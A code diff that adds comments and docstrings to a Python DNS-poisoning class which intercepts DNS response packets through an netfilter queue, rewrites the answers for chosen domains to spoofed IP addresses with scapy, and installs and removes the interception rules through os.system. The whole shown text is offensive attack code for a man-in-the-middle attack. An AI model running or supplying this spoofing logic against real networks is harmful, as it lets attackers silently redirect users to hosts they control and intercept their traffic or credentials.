@@ -23,17 +23,17 @@ class DnsPoisoner(multiprocessing.Process):
         self.urls_to_spoof[url] = ip
 
     def handle_packet(self, packet_nfqueue):
-
+        """Handles each packet in the queue by editing them if neccessary."""
         packet_scapy = IP(packet_nfqueue.get_payload())    #converts the raw packet to a scapy compatible string
         
         if packet_scapy.haslayer(DNSRR):
-            packet_scapy = self.edit_dnsrr(packet_scapy)
-            packet_nfqueue.set_payload(bytes(packet_scapy))
+            packet_scapy = self.edit_dnsrr(packet_scapy)    #edit packet for spoof
+            packet_nfqueue.set_payload(bytes(packet_scapy))    #converts scapy compatible string back to raw packet
 
-        packet_nfqueue.accept()
+        packet_nfqueue.accept()    #accept the packet and release it back into the wild
 
     def edit_dnsrr(self, packet):
-
+        """Edits DNS request answer in order to poison"""
         if packet[DNSQR].qname in self.urls_to_spoof.keys():
             
             if packet[DNSQR].qtype == "A":
@@ -46,15 +46,15 @@ class DnsPoisoner(multiprocessing.Process):
 
     def run(self):
 
-        os.system(self.iprule_add)
-        self.queue.run()
+        os.system(self.iprule_add)    #make sure DNS packets are intercepted
+        self.queue.run()    #queue starts accepting packages
 
         while not self.exit:
             time.sleep(1)
 
-        self.queue.unbind()
+        self.queue.unbind()    #delete queue
 
     def stop(self):
 
-        os.system(self.iprule_remove)
+        os.system(self.iprule_remove)    #make sure DNS packets are not intercepted anymore
         self.exit = True
